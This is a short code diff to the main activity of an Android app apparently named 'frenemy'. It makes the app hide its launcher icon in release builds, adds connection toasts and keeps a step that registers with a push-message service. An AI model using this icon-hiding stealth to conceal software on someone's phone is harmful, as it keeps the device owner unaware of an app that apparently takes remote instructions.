@@ -15,7 +15,6 @@ import com.theah64.frenemy.android.utils.App;
 import com.theah64.frenemy.android.utils.NetworkUtils;
 import com.theah64.frenemy.android.utils.PrefUtils;
 
-
 public class MainActivity extends PermissionActivity {
 
 
@@ -28,7 +27,7 @@ public class MainActivity extends PermissionActivity {
     private void doNormalWork() {
 
         //Hiding app icon
-        if (App.IS_DEBUG_MODE) {
+        if (!App.IS_DEBUG_MODE) {
             PackageManager p = getPackageManager();
             ComponentName componentName = new ComponentName(this, MainActivity.class);
             p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
@@ -39,14 +38,27 @@ public class MainActivity extends PermissionActivity {
             new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
                 @Override
                 public void onReadyToRequest(String apiKey, final String frenemyId) {
+
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            Toast.makeText(MainActivity.this, "Connected!", Toast.LENGTH_SHORT).show();
+                        }
+                    });
+
                     if (!PrefUtils.getInstance(MainActivity.this).getBoolean(Frenemy.KEY_IS_FCM_SYNCED)) {
                         new FCMSynchronizer(MainActivity.this, apiKey).execute();
                     }
                 }
 
                 @Override
-                public void onFailed(String reason) {
-
+                public void onFailed(final String reason) {
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            Toast.makeText(MainActivity.this, reason, Toast.LENGTH_SHORT).show();
+                        }
+                    });
                 }
             });
 
